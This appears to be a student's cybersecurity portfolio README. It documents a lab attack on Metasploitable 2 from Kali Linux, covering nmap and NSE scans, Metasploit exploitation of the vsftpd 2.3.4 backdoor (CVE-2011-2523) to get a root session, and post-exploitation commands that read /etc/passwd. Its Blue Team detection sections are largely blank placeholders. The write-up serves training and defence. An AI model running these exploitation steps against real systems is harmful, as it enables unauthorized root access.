# Full-Kill-Chain-Red-and-Blue-Teams


**Author:** Dashane James  
**Lab Environment:** [e.g. VMware Workstation | Kali Linux | Metasploitable 2]  
**Purpose:** [Run a complete attack simulation then switch roles and detect every stage of it.]
**Status:** 🔵 Completed

---

## 📋 Overview

This repository documents a full adversary kill chain executed in an isolated lab environment. Using Kali Linux as the attacker and Metasploitable 2 as the target, the attack was carried out from initial reconnaissance through exploitation and post-exploitation while TCPDump captured all network traffic. The role then shifted to Blue Team — the capture was ingested into Splunk and SPL queries were used to detect every stage of the attack. This lab demonstrates both offensive execution and defensive detection in a single workflow. 

---

## 🧪 Lab Environment

| Component | Details |
|---|---|
| Hypervisor | VMware Workstation (Host-Only Network) |
| Attacker Machine | Kali Linux 2026.1 — `192.168.79.129` |
| Target Machine | [Metasploitable 2] — `192.168.79.130` |
| Network Type | Host-Only (isolated, no internet exposure) |
| Host OS | Windows 11 — ASUS Vivobook 14 |

> ⚠️ **Note:** All activity was performed in a controlled, isolated lab environment against deliberately vulnerable machines. No unauthorized access to live networks was performed.

---

## 🛠️ Tools Used

- **Nmap** — Service version detection and NSE vulnerability scanning
- **NSE (Nmap Scripting Engine)** — `ftp-vsftpd-backdoor` script used to confirm live exploitation before launching Metasploit
- **Metasploit Framework** — Exploited the vsftpd 2.3.4 backdoor via `exploit/unix/ftp/vsftpd_234_backdoor` to obtain a root Meterpreter session
- **TCPDump** — Captured all network traffic during the attack for later Blue Team analysis
- **Splunk SIEM** — Ingested the packet capture and ran SPL detection queries to identify each attack stage

---



---

## 🔬 Tasks / Assessments Performed

### RED TEAM (ATTACK)
### 1. [Recon: NMAP Scan to discover services]

For this task, a full TCP connect scan with service version detection was run against the target to identify all open ports and running services before any exploitation was attempted.

# Commands used
sudo nmap -sT -Pn --disable-arp-ping -n -sV 192.168.79.130 -oN ~/killchain_nmap.txt


# Output

Nmap returned multiple open services including FTP (21/vsftpd 2.3.4), SSH (22), Telnet (23), HTTP (80), and others. vsftpd 2.3.4 on port 21 was flagged as the primary target — this version is publicly known to contain an intentional backdoor.

**Findings:**

vsftpd 2.3.4 identified on port 21. This version is listed in the NVD as CVE-2011-2523 with a CVSS score of 9.8 (Critical) and is known to be directly exploitable for root access.

### 2. [Scanning: using NSE scripts to find vulnerabilities]

Before launching Metasploit, the Nmap `ftp-vsftpd-backdoor` script was used to actively verify that the backdoor was present and exploitable on the target.

# Command used

sudo nmap -sV --script=ftp-vsftpd-backdoor -Pn --disable-arp-ping -n -p 21 192.168.79.130


# Output

The script returned `VULNERABLE (Exploitable)` — confirming the backdoor is live. The vsftpd 2.3.4 backdoor is triggered by appending `:)` to the FTP username during login, which causes the server to open a root shell on port 6200.

**Findings:**

Live exploitability confirmed prior to Metasploit. CVE-2011-2523, CVSS 9.8. This is an unusual NSE result — most vulnerability scripts only detect and report (true/false), but `ftp-vsftpd-backdoor` actively attempts exploitation and returns the shell output, making it one of the few NSE scripts that crosses from detection into exploitation.

### 3. [Exploitation: using Metasploit to gain access.]
With the vulnerability confirmed, the Metasploit Framework was used to exploit the backdoor and open a Meterpreter session on the target. 


# Meterpreter Commands used

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.79.130
set LHOST 192.168.79.129
run
# Output

[] Started reverse TCP handler on 192.168.79.129:4444
[+] 192.168.79.130:21 - Backdoor service has been spawned!
[] Meterpreter session 1 opened (192.168.79.129:4444 → 192.168.79.130:46275)

```

**Findings:**

Root-level Meterpreter session opened with no credentials and no privilege escalation required. The backdoor spawns directly as uid=0 (root). The reverse shell callback connected from Metasploitable to Kali on port 4444.


### 4. [Post Exploitation: enumerate users and sensitive files.]

With root access confirmed, post-exploitation commands were run inside a native OS shell on the target to enumerate the system and demonstrate the level of access an attacker would have.

#Commands used

shell
whoami
id
uname -a
cat /etc/passwd
ls /home


# Output
.



**Findings:**

Full root access confirmed. An attacker with this level of access could read, modify, or exfiltrate any file on the system, create persistence, pivot to other hosts, or destroy evidence. The `/etc/passwd` file exposure reveals all local user accounts and their login shells.



### BLUE TEAM (DETECT)
### 1. Review TCPDUMP capture of all attack activity.

For this task TCPDump was running in a separate terminal throughout the entire attack, capturing all network traffic to a `.pcap` file. After the attack completed, the capture was converted to text for Splunk ingestion.

# Command used

Capture (ran during attack) > sudo tcpdump -i eth0 -w ~/full_killchain.pcap

Convert to text after attack > tcpdump -r ~/full_killchain.pcap -nn -tttt > ~/killchain_capture.txt


# Output


**Findings:**
1

### 2. Identify each attack stage in the packet capture.
[]

# Command used
[]


# Output



**Findings:**
0
### 3. Write a Splunk detection rule for each stage.
[] 


# Command used
[]
# Output

2
```

**Findings:**





### 4. [Map each stage to ATT&CK tactic and NIST IR phase.]


#Command
[]

# Output
.



**Findings:** 

Port / Service / Vulnerability / NSE Script / Severity / Notes

21/tcp (FTP) - ftp-vsftpd-backdoor (CVE-2011-2523)	🔴 Critical	Live exploitation confirmed. The vulnerable vsFTPd 2.3.4 backdoor allowed remote command execution and root shell access. (CVSS 9.8)

22/tcp (SSH) - Weak SSH cryptographic configuration - 🟡 Medium	Weak or outdated cryptographic algorithms were identified, potentially reducing the security of encrypted communications.

23/tcp (Telnet) - Telnet service detected	🟠 High	Telnet transmits credentials in plaintext, making usernames and passwords susceptible to interception.

80/tcp (HTTP) - Slowloris Denial-of-Service	🟡 Medium	The web server appears susceptible to the Slowloris DoS attack, which can exhaust server connections and deny service to legitimate users.

80/tcp (HTTP) - HTTP TRACE method enabled	🟢 Low	TRACE is enabled, which may aid reconnaissance or cross-site tracing attacks but does not directly compromise the server.

80/tcp (HTTP) - SQL Injection vulnerability	🟠 High	SQL injection was detected and could allow attackers to retrieve, modify, or delete database information.

111/tcp (rpcbind) - RPC information disclosure	🟢 Low	rpcbind exposes information about available RPC services, assisting attacker reconnaissance.

139/tcp (NetBIOS/SMB) - SMB enumeration	🟡 Medium	SMB information disclosure allows attackers to gather host and share information useful for later attacks.

445/tcp (SMB) - smb-vuln-ms10-061 🟢 Not Vulnerable	NSE script returned false, indicating the system is not vulnerable to MS10-061.

445/tcp (SMB) - smb-vuln-ms10-054 🟢 Not Vulnerable	NSE script returned false, indicating the target is not affected by MS10-054.

445/tcp (SMB) - smb-vuln-regsvc-dos	⚪ Inconclusive	The script failed to complete successfully, so the vulnerability status could not be determined.

3306/tcp (MySQL) - MySQL information disclosure	🟡 Medium	Database version and service information were exposed, which may help attackers identify known exploits.

443/tcp (HTTPS) - Logjam (Weak Diffie-Hellman Parameters) 🟡 Medium	Weak Diffie-Hellman parameters reduce TLS security and could allow encrypted communications to be weakened under certain attack scenarios

**Findings:** 

The table above consolidates all of the findings reported during the Nmap --script vuln scan and categorizes each result by severity. The most significant finding was the vsFTPd 2.3.4 backdoor (CVE-2011-2523) on port 21, which was successfully exploited to obtain root-level access, making it the only Critical vulnerability confirmed through live exploitation. Several additional weaknesses were identified, including SQL injection, Telnet running without encryption, Slowloris denial-of-service susceptibility, and weak SSH cryptographic settings, all of which increase the attack surface of the target system. The SMB vulnerability checks also demonstrated that vulnerability scans can produce different outcomes: some scripts confirmed the system was not vulnerable, while others returned inconclusive results because the checks could not be completed. Overall, the scan illustrates the importance of reviewing every NSE script result individually, as findings may represent confirmed vulnerabilities, informational issues, successful mitigations, or inconclusive tests requiring additional investigation.

---

## 📊 Key Findings Summary

| Port/Service | Tool Used | Risk Level | Notes |

| 21/tcp FTP | Nmap (`vuln`, `ftp-anon`) | 🔴 Critical | vsFTPd 2.3.4 backdoor (CVE-2011-2523) — live exploitation confirmed, root access achieved |
| 23/tcp Telnet | Nmap (`vuln`) | 🟠 High | Transmits credentials in plaintext, vulnerable to interception |
| 80/tcp HTTP | Nmap (`vuln`) | 🟠 High | SQL injection vulnerability detected |
| 80/tcp HTTP | Nmap (`vuln`) | 🟡 Medium | Susceptible to Slowloris denial-of-service attack |
| 445/tcp SMB | Nmap (`-sC`, `smb-vuln*`) | 🟡 Medium | Message signing disabled; guest authentication allowed |
| 22/tcp SSH | Nmap (`vuln`) | 🟡 Medium | Weak/outdated cryptographic configuration identified |
| 3306/tcp MySQL | Nmap (`vuln`) | 🟡 Medium | Database version and service info exposed |

**Risk Levels:** 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low


---

## 🗺️ MITRE ATT&CK Mapping

| Action Performed | ATT&CK Tactic | Technique ID | Technique Name |
|---|---|---|---|
| Default and targeted script scanning (-sC, ftp-anon, smb-vuln*) | Reconnaissance | T1595 | Active Scanning |
| Anonymous FTP login confirmed | Initial Access | T1078 | Valid Accounts |
| vsFTPd backdoor exploitation (root shell via `id` command) | Execution | T1059 | Command and Scripting Interpreter |
| Root-level access confirmed post-exploitation | Privilege Escalation | T1068 | Exploitation for Privilege Escalation |

---

## 🛡️ Defensive Recommendations

Based on findings, the following remediations would be recommended in a real environment:

1. **vsFTPd 2.3.4 backdoor (Critical)** — Immediately upgrade or replace the FTP service; this version is known to contain an intentional backdoor and should never be used in production.
2. **Anonymous FTP login allowed** — Disable anonymous access entirely; require authenticated accounts for any FTP access.
3. **Telnet enabled (plaintext credentials)** — Disable Telnet and replace with SSH for all remote administration.
4. **SMB message signing disabled** — Enable SMB message signing to prevent tampering and man-in-the-middle attacks on SMB traffic.
5. **SQL injection on port 80** — Implement input validation/parameterized queries on the web application, and consider a WAF as an additional layer of defense.

---

## 📚 CySA+ Exam Relevance

This lab directly maps to the following CompTIA CySA+ (CS0-003) exam domains:

| Domain | Coverage |

| Security Operations (33%) | Hands-on use of Nmap and NSE scripts to perform reconnaissance and identify live services and misconfigurations |
| Vulnerability Management (30%) | Running vulnerability-check scripts (`smb-vuln*`, `vuln`), interpreting results, and cross-referencing CVE/CVSS data from NVD |
| Incident Response (20%) | Recognizing confirmed exploitation (root access via vsFTPd backdoor) as evidence of active compromise |
| Reporting & Communication (17%) | Documenting findings by severity in a structured, readable format for technical and non-technical audiences |

---

## 🔑 Technical Notes

> # Note: not all NSE vulnerability scripts behave the same way — most only detect and report (true/false), while a small number (like ftp-vsftpd-backdoor) actually attempt live exploitation. Always check script documentation or output carefully rather than assuming uniform behavior.
>
> "Always add the -n flag to Nmap scans in this VMware environment to prevent DNS resolution hangs."]
> 
> -sP and -sT contradict eachother (Can't be used together because -sP means just do a ping/host-discovery sweep, skip ports entirely but -sT tells Nmap to do a full TCP connect port scan. These commands contradict eachother.)

```bash

# Any important commands or workarounds
[-sC]
[-Pn]

# Any important commands or workarounds

# Task 1: Run default scripts (-sC) against key ports
sudo nmap -sC -Pn --disable-arp-ping -n -p 21,22,80,445 192.168.79.130

# Task 2: Check FTP for anonymous login specifically
sudo nmap --script ftp-anon -Pn --disable-arp-ping -n -p 21 192.168.79.130

# Task 3: Run all SMB vulnerability scripts against port 445
sudo nmap --script smb-vuln* -Pn --disable-arp-ping -n -p 445 192.168.79.130

# Task 4: Run the full vuln script category across all open ports
sudo nmap --script vuln -Pn --disable-arp-ping -n 192.168.79.130

# Workaround: -p requires a value directly after it — omitting the port number
# (e.g. "-p 192.168.79.130") causes Nmap to misinterpret the target IP as a
# port specification. To scan all ports instead of a specific one, remove
# the -p flag entirely rather than leaving it empty.

# Workaround: always use -n in this lab to prevent DNS resolution hangs,
# since the isolated Host-Only network has no real DNS server.

# Note: --script <name>* (wildcard) runs every NSE script matching that
# name pattern — useful for running a whole category (e.g. smb-vuln*)
# in a single command instead of specifying each script individually.
```

---

## 📌 About This Project

[1-2 sentences about how this fits into your overall portfolio and career goals.]

This repository is part of my broader cybersecurity portfolio demonstrating practical, hands-on vulnerability assessment skills from initial scanning through confirmed exploitation as I work toward a career as a cybersecurity analyst.

This repository is important because here we have built up to the point of having live proof of the actual exploitation by an automated Nmap script for the CVE-2011-2523. In a past NVD task I researched this exact vulnerability with a CVSS score of 9.8 now this has come full circle and we found out how this exact vulnerability is exploited and root access was acheived. 


**Related repositories:**
- Nmap-Host-Discovery-and-Lab-Baseline — Established a baseline of the lab network using ping sweeps and host discovery, documenting the target environment before deeper scanning began
- Nmap-Scan-Types-SYN-vs-TCP-vs-UDP — Compared SYN, TCP connect, and UDP scan types against the target, examining differences in speed, stealth, and reliability
- Service-Version-Detection-and-OS-Fingerprinting — Identified exact software versions on Metasploitable and researched real CVEs tied to them, including the vsFTPd backdoor later exploited in this repository
- Wireshark-Capture-and-Analyze-Traffic — Captured and analyzed live packet traffic, including plaintext credential exposure over Telnet
- TCPDump-CLI-Packet-Capture — Used TCPDump from the command line to capture traffic (including a live Telnet session showing plaintext credential exposure), and demonstrated saving captures to a `.pcap` file for later analysis in Wireshark

---

## 👤 Author

**Dashane James**  
Senior Field Service Technician → Cybersecurity Analyst  
📍 Yonkers, NY  
🎓 B.S. Information Technology — SUNY Canton  
🏆 CompTIA Security+ | CySA+ (In Progress)  
🔗 [GitHub](https://github.com/Dashanejames1) | [Zero Trust Cyber Security Brand](https://www.instagram.com/zerotrust_cybersecurity)

---

*This repository is part of an active portfolio demonstrating hands-on cybersecurity skills. All lab work performed in isolated environments for educational purposes.*0
